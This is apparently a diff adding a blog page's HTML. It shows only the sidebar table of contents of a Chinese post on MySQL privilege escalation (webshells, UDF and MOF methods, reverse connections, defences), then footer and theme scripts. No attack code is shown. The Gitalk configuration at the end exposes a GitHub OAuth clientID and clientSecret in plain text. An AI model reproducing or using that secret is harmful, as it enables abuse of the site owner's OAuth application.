+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01关系型数据库管理系统MySQL提权基础"><span class="nav-number">1.</span> <span class="nav-text">0x01关系型数据库管理系统MySQL提权基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、Mysql提权必备条件"><span class="nav-number">1.1.</span> <span class="nav-text">一、Mysql提权必备条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、Mysql密码获取与破解"><span class="nav-number">1.2.</span> <span class="nav-text">二、Mysql密码获取与破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-获取网站数据库账号和密码"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.获取网站数据库账号和密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-获取Mysql数据库user表"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.获取Mysql数据库user表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Mysql密码查询"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.Mysql密码查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-MySQL密码加密算法"><span class="nav-number">1.2.4.</span> <span class="nav-text">4.MySQL密码加密算法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、Mysql获取webshell"><span class="nav-number">1.3.</span> <span class="nav-text">三、Mysql获取webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、Mysql渗透有用的一些技巧总结"><span class="nav-number">1.4.</span> <span class="nav-text">四、Mysql渗透有用的一些技巧总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-常见的有助于渗透到mysql函数"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.常见的有助于渗透到mysql函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Windows下MySQL提权时无法创建目录解决办法及数据流隐藏Webshell"><span class="nav-number">1.4.2.</span> <span class="nav-text">2. Windows下MySQL提权时无法创建目录解决办法及数据流隐藏Webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-有用的一些技巧"><span class="nav-number">1.4.3.</span> <span class="nav-text">3.有用的一些技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-一些常见的Mysql命令"><span class="nav-number">1.4.4.</span> <span class="nav-text">4.一些常见的Mysql命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-MySQL数据库反弹端口连接提权"><span class="nav-number">2.</span> <span class="nav-text">0x02 MySQL数据库反弹端口连接提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、反弹端口连接提权的条件"><span class="nav-number">2.1.</span> <span class="nav-text">一、反弹端口连接提权的条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、具体实现方法"><span class="nav-number">2.2.</span> <span class="nav-text">二、具体实现方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-连接mysql服务器"><span class="nav-number">2.2.1.</span> <span class="nav-text">1.连接mysql服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-执行查询命令"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.执行查询命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-添加用户或者获取管理员密码"><span class="nav-number">2.2.3.</span> <span class="nav-text">3.添加用户或者获取管理员密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、一个提权实例"><span class="nav-number">2.3.</span> <span class="nav-text">三、一个提权实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-在反弹监听服务器上进行端口监听"><span class="nav-number">2.3.1.</span> <span class="nav-text">1.在反弹监听服务器上进行端口监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-修改mysql-txt文件中反弹地址"><span class="nav-number">2.3.2.</span> <span class="nav-text">2.修改mysql.txt文件中反弹地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-查看反弹结果"><span class="nav-number">2.3.3.</span> <span class="nav-text">3.查看反弹结果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、防范方法"><span class="nav-number">2.4.</span> <span class="nav-text">四、防范方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-实例解析：MySQL数据库扩展接口UDF提权"><span class="nav-number">3.</span> <span class="nav-text">0x03 实例解析：MySQL数据库扩展接口UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、UDF函数简介"><span class="nav-number">3.1.</span> <span class="nav-text">一、UDF函数简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-UDF介绍"><span class="nav-number">3.1.1.</span> <span class="nav-text">1.UDF介绍</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、Windows下UDF提权的条件和方法"><span class="nav-number">3.2.</span> <span class="nav-text">二、Windows下UDF提权的条件和方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-UDF提权条件"><span class="nav-number">3.2.1.</span> <span class="nav-text">1. UDF提权条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-提权方法"><span class="nav-number">3.2.2.</span> <span class="nav-text">2.提权方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、一个提权实例-1"><span class="nav-number">3.3.</span> <span class="nav-text">三、一个提权实例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、其它提权工具"><span class="nav-number">3.4.</span> <span class="nav-text">四、其它提权工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、UDF提权总结与防范"><span class="nav-number">3.5.</span> <span class="nav-text">五、UDF提权总结与防范</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-MySQL数据库Root权限MOF方法提权研究"><span class="nav-number">3.6.</span> <span class="nav-text">0x04 MySQL数据库Root权限MOF方法提权研究</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一、漏洞利用方法分析"><span class="nav-number">3.7.</span> <span class="nav-text">一、漏洞利用方法分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、实战利用"><span class="nav-number">3.8.</span> <span class="nav-text">二、实战利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、防范方法"><span class="nav-number">3.9.</span> <span class="nav-text">三、防范方法</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
